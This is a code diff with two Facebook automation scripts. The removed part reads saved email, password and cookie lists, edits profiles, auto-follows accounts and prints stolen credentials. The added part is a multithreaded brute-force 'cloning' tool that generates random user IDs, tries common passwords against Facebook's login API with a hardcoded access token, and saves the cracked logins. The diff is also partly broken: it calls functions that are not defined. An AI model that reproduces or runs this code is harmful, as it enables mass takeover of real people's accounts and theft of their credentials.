-            req = bs(self.xyz.get(url,cookies=self.cookie,headers=self.head1).content,'html.parser')
-            raq = req.find('form',{'method':'post'})
-            dat = {
-                'fb_dtsg'         : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'jazoest'         : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'bio'             : self.nm,
-                'publish_to_feed' : True,
-                'submit'          : 'Simpan'}
-            pos = bs(self.xyz.post('https://mbasic.facebook.com'+raq['action'],data=dat,cookies=self.cookie,headers=self.head1).content,'html.parser')
-        except Exception as e:
-            pass
-    
-    #--> Auto Follow
-    def auto_follow(self):
-        acc = ['1827084332','100000415317575']
-        for x in acc:
-            url = f'https://mbasic.facebook.com/profile.php?id={x}'
-            try:
-                req = bs(self.xyz.get(url,cookies=self.cookie,headers=self.head1).content,'html.parser')
-                raq = req.find('a',string='Ikuti')
-                get = self.xyz.get('https://mbasic.facebook.com'+raq['href'],cookies=self.cookie,headers=self.head1)
-            except Exception as e:
-                pass
-    
-    #--> Edit Kota Asal & Tempat Tinggal
-    def kota(self,url,a,b,kota):
-        try:
-            req = bs(self.xyz.get(url,cookies=self.cookie,headers=self.head1).content,'html.parser')
-            raq = req.find('form',{'method':'post'})
-            dat = {
-                'fb_dtsg'    : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'jazoest'    : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'edit'       : a,
-                'type'       : 'basic',
-                b : kota,
-                'save'       : 'Simpan'}
-            pos = bs(self.xyz.post('https://mbasic.facebook.com'+raq['action'],data=dat,cookies=self.cookie,headers=self.head1).content,'html.parser')
-        except Exception as e:
-            pass
-    
-    #--> Edit Website
-    def website(self):
-        try:
-            url = 'https://mbasic.facebook.com/editprofile.php?type=contact&edit=website'
-            req = bs(self.xyz.get(url,cookies=self.cookie,headers=self.head1).content,'html.parser')
-            raq = req.find('form',{'method':'post'})
-            dat = {
-                'fb_dtsg'    : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'jazoest'    : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'type'       : 'contact',
-                'edit'       : 'website',
-                'add_website': '1',
-                'new_info'   : 'https://github.com/Dapunta',
-                'save'       : 'Tambahkan'}
-            pos = bs(self.xyz.post('https://mbasic.facebook.com'+raq['action'],data=dat,cookies=self.cookie,headers=self.head1).content,'html.parser')
-        except Exception as e:
-            pass
-    
-    #--> Logout Akun Manual
-    def logout(self):
-        global ok, cp
-        try:
-            req = bs(self.xyz.get('https://mbasic.facebook.com/',cookies=self.cookie,headers=self.head1).content,'html.parser')
-            url = ['https://mbasic.facebook.com'+x['href'] for x in req.find_all('a',href=True) if 'logout.php' in str(x['href'])][0]
-            roq = bs(self.xyz.get(url,cookies=self.cookie,headers=self.head1).content,'html.parser')
-            if 'checkpoint' in str(roq):
-                if tampil in ['t','2','02','b']: pass
-                else:
-                    print('\r%sStatus : %sCheckpoint%s                         '%(P,M,P))
-                    print('Nama   : %s'%(self.nm))
-                    print('TTL    : %s'%(self.ttl))
-                    print('Email  : %s'%(self.nope))
-                    print('Pass   : %s'%(self.pw))
-                    print('IP     : %s'%(self.ip('M')))
-                    print('')
-                cp += 1
-            else:
-                print('\r%sStatus : %sOK%s                         '%(P,H,P))
-                print('Nama   : %s'%(self.nm))
-                print('ID     : %s'%(self.id))
-                print('TTL    : %s'%(self.ttl))
-                print('Email  : %s'%(self.em))
-                print('Pass   : %s'%(self.pw))
-                print('IP     : %s'%(self.ip('H')))
-                print('Cookie : %s'%(self.cookie))
-                print('')
-                open(self.file,'a+').write('%s|%s|%s\n'%(self.em,self.pw,self.cookie))
-                ok += 1
-        except Exception as e:
-            if tampil in ['t','2','02','b']: pass
-            else:
-                print('\r%sStatus : %sCheckpoint%s                         '%(P,M,P))
-                print('Nama   : %s'%(self.nm))
-                print('TTL    : %s'%(self.ttl))
-                print('Email  : %s'%(self.nope))
-                print('Pass   : %s'%(self.pw))
-                print('IP     : %s'%(self.ip('M')))
-                print('')
-            cp += 1
-
-#--> Menu Check
-class menu_check:
-
-    #--> Tanya Tanya
-    def __init__(self):
-        self.xyz = requests.Session()
-        self.isi = 0
-        self.ok  = 0
-        self.cp  = 0
-        self.head = {'accept-encoding' : 'gzip, deflate','accept-language' : 'en-US,en;q=0.9','cache-control' : 'max-age=0','referer' : 'https://mbasic.facebook.com/login/?next&ref=wizard&fl&login_from_aymh=1&refid=8','sec-ch-ua' : '','sec-ch-ua-mobile' : '?1','sec-ch-ua-platform' : 'Android','sec-fetch-dest' : 'document','sec-fetch-mode' : 'navigate','sec-fetch-site' : 'same-origin','sec-fetch-user' : '?1','upgrade-insecure-requests' : '1','user-agent' : random_ua_vivo()}
-        f = 'Akun_New'
-        if os.path.isdir(f):
-            l = os.listdir(f)
-            for y in l:
-                c = '%sâ€¢ %s%s'%(M,P,y)
-                print(c)
-            self.tanya()
-        else:
-            print('%sMaaf, Belum Ada Hasil %s:(%s\n'%(P,M,P))
-    def tanya(self):
-        cf = input('%s\n[%sâ€¢%s] %sCek Akun Aktif Dengan Cookie [%sy%s/%st%s] : '%(M,P,M,P,M,P,H,P)).lower()
-        if cf in ['y','1','01','a']:
-            cok = input('%s[%sâ€¢%s] %sMasukkan Cookie : '%(M,P,M,P))
-            try:
-                self.token  = self.generate_token(cok)
-                self.cookie = {'cookie':cok}
-                self.ceker_cookie()
-            except Exception as e:
-                print('%sCookie Invalid!%s'%(M,P))
-                time.sleep(2)
-                clear()
-                menu()
-        else:
-            self.ceker_biasa()
-
-    #--> Check Akun Dengan Cookie
-    def generate_token(self,cok):
-        url = 'https://business.facebook.com/business_locations'
-        req = self.xyz.get(url,headers=self.head,cookies={'cookie':cok})
-        tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
-        return(tok)
-    def ceker_cookie(self):
-        try:
-            d = input('%s[%sâ€¢%s] %sMasukkan File : '%(M,P,M,P))
-            l = 'Akun_New/%s'%(d)
-            g = open(l,'r').read().splitlines()
-            print('')
-            for a in g:
-                self.check(a)
-            if self.isi == 0: print('%sTidak Ada Hasil :(\n%s'%(M,P))
-            else: print('%sDari %s Akun, Terdapat %s%s Akun CP %sdan %s%s Akun OK\n%s'%(P,str(self.isi),M,str(self.cp),P,H,str(self.ok),P))
-        except Exception as e:
-            print('%sFile Tidak Ditemukan!\n%s'%(M,P))
-    def check(self,daf):
-        try: 
-            em, pw, ck = daf.split('|')
-            id = re.search('c_user=(.*?);',str(ck)).group(1)
-            url = f'https://mbasic.facebook.com/profile.php?id={id}'
-            req = bs(self.xyz.get(url,headers=self.head,cookies=self.cookie).content,'html.parser')
-            cek = req.find('title').text
-            if cek == 'Konten tidak tersedia' or cek == 'Content unavailable' or cek == 'Kesalahan' :
-                print('%sID     : %s%s%s'%(P,M,id,P))
-                print('%sEmail  : %s'%(P,em))
-                print('%sPass   : %s\n'%(P,pw))
-                self.cp += 1
-            else:
-                print('%sID     : %s%s%s'%(P,H,id,P))
-                print('%sEmail  : %s'%(P,em))
-                print('%sPass   : %s'%(P,pw))
-                print('%sCookie : %s%s%s\n'%(P,H,ck,P))
-                self.ok += 1
-            self.isi += 1
-        except Exception as e: pass
-
-    #--> Check Akun Tanpa Cookie
-    def ceker_biasa(self):
-        try:
-            d = input('%s[%sâ€¢%s] %sMasukkan File : '%(M,P,M,P))
-            l = 'Akun_New/%s'%(d)
-            g = open(l,'r').read().splitlines()
-            print('')
-            for a in g: self.lisi(a)
-            if self.isi == 0: print('%sTidak Ada Hasil :(\n%s'%(M,P))
-            else: print('%sTerdapat %s Akun :)\n%s'%(H,str(self.isi),P))
-        except Exception as e:
-            print('%sFile Tidak Ditemukan!\n%s'%(M,P))
-    def lisi_biasa(self,daf):
-        try: 
-            em, pw, ck = daf.split('|')
-            id = re.search('c_user=(.*?);',str(ck)).group(1)
-            print('%sID     : %s%s%s'%(P,H,id,P))
-            print('%sEmail  : %s'%(P,em))
-            print('%sPass   : %s'%(P,pw))
-            print('%sCookie : %s%s%s\n'%(P,H,ck,P))
-            self.isi += 1
-        except Exception as e: pass
-
-#--> Notice
-def belum_tersedia():
-    print('%sMaaf, Fitur Ini %sBelum Tersedia%s'%(P,M,P))
-    print('%sTunggu Update Selanjutnya...'%(P))
-    print('%sTerima Kasih!'%(P))
-    print('%s- %sDapunta%s\n'%(P,H,P))
-
-#--> Trigger
-if __name__ == '__main__':
-    
+	os.system('clear')
+logo="""\x1b[1;97m
+  ███    ███ ██████         ███████ ██████  ██    ██ 
+  ████  ████ ██   ██        ██      ██   ██  ██  ██  
+  ██ ████ ██ ██████         ███████ ██████    ████   
+  ██  ██  ██ ██   ██             ██ ██         ██    
+  ██      ██ ██   ██ ██     ███████ ██         ██    
+                                                   
+     ┌───────────────────────────────────────┐
+     │ [💸] CODED BY : SHAHIN ALAM           │
+     │ [💸] GITHUB   : SPY1x1                │
+     │ [💸] WHATSAPP : +8801615161056        │
+     │ [💸] VERSION  : OLD                   │
+     │ [💸] HACKED   : \033[1;32mMr. SPY \033[1;37m              │
+     └───────────────────────────────────────┘"""
+class Main:
+	def __init__(self):
+		self.id = []
+		self.ok = []
+		self.cp = []
+		self.loop = 0
+		os.system("clear")
+		print(logo)
+		print("	[1] 2009-10 cloning ")
+		print("	[2] 2011-14 cloning ")
+		print("	[3] 2015-20 cloning ")
+		print("\033[0;91m [E] Exit \n")
+		SHAHIN =input(" \033[0;93mChoose : ")
+		if SHAHIN in ["1", "01"]:
+			self.old()
+		if SHAHIN in ["2", "02"]:
+			self.old2()
+		if SHAHIN in ["3", "03"]:
+			self.old3()
+		else:
+			print (" Select Correctly ")
+			time.sleep(1)
+			Main()
+ 
+	def old(self):
+		x = 111111111
+		xx = 999999999
+		idx = "100000" 
+		os.system('clear');print(logo)
+		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50000: "))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=50) as coeg:
+				print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
+				listpass = ['123456','12345678','@#@#@#']
+				os.system("clear")
+				print(logo)
+				print("     \033[0;93m   FREE MODE ACTIVATE")
+				print("\n\033[0;94m [+] BRUTE HAS BEEN START")
+				print(" \033[0;96m[+] Note: 0k Open 70% JUST NOW")
+				print(" [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS")
+				print("\033[0;94m----------------------------------------------")
+				print("\n")
+				print("\033[0;97m")
+				for user in self.id:
+					coeg.submit(self.api, user, listpass)
+			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using my tool...")
+		except Exception as e:exit(str(e))
+ 
+	def api(self, uid, pwx):
+		ug=random.choice(rug)
+		sys.stdout.write(
+			"\r [MR.SPY-VIP]%s /%s -Ok:-%s | Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+		); sys.stdout.flush()
+		for pw in pwx:
+			pw = pw.lower()
+			ses = requests.Session()
+			headers = {
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+				"x-fb-net-hni": str(random.randint(20000, 40000)), 
+				"x-fb-connection-quality": "EXCELLENT",
+				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+				"user-agent": ug, 
+				"content-type": "application/x-www-form-urlencoded", 
+				"x-fb-http-engine": "Liger"
+			}
+			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+			if "session_key" in response.text:
+				print("\r \033[0;92m[SPY-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print ("\r \033[0;92m Congrats ")
+				self.ok.append("%s|%s"%(uid, pw))
+				open("2009-MRD-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				break
+			elif "www.facebook.com" in response.json()["error_msg"]:
+				print("\r \033[0;92m[SPY-OK] %s | %s\033[0;97m         "%(uid, pw))
+				self.cp.append("%s|%s"%(uid, pw))
+				open("2009-SHARIF-ISLAM-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				break
+			else:
+				continue
+ 
+		self.loop +=1
+ 
+	def old2(self):
+		x = 1111111111
+		xx = 9999999999
+		idx = "10000" 
+		os.system('clear');print(logo)
+		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
+				listpass = ["123456","12345678"]
+				os.system("clear")
+				print(logo)
+				print("     \033[0;93m   FREE MODE ACTIVATE")
+				print("\n\033[0;94m [+] BRUTE HAS BEEN START")
+				print(" \033[0;96m[+] Note: Ok Open 70% just now")
+				print(" [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS")
+				print("\033[0;94m--------------------------------------------")
+				print("\n")
+				print("\033[0;97m")
+				for user in self.id:
+					coeg.submit(self.api, user, listpass)
+			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using my tool...")
+		except Exception as e:exit(str(e))
+ 
+	def api(self, uid, pwx):
+		ug=random.choice(rug)
+		sys.stdout.write("\r [MR.SPY-VIP]%s /%s -Ok:-%s | Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))); sys.stdout.flush()
+		for pw in pwx:
+			pw = pw.lower()
+			ses = requests.Session()
+			headers = {
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+				"x-fb-net-hni": str(random.randint(20000, 40000)), 
+				"x-fb-connection-quality": "EXCELLENT",
+				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+				"user-agent": ug, 
+				"content-type": "application/x-www-form-urlencoded", 
+				"x-fb-http-engine": "Liger"
+			}
+			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+			if "session_key" in response.text and "EAAA" in response.text:
+				print("\r \033[0;92m[SPY-GO ] %s | %s\033[0;97m         "%(uid, pw))
+				#print ("\r \033[0;92m Congrats ")
+				self.ok.append("%s|%s"%(uid, pw))
+				open("2009-SHARIF-ISLAM-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				break
+			elif "www.facebook.com" in response.json()["error_msg"]:
+				print("\r \033[0;92m[SPY-OK] %s | %s\033[0;97m         "%(uid, pw))
+				self.cp.append("%s|%s"%(uid, pw))
+				open("2009-SHARIF-ISLAM-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				break
+			else:
+				continue
+ 
+		self.loop +=1
+ 
+if len(sys.argv) == 2:
+	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
+		helpnote()
+	else:
+		Main()
+ 
+try:Main()
+except Exception as e:exit(str(e))
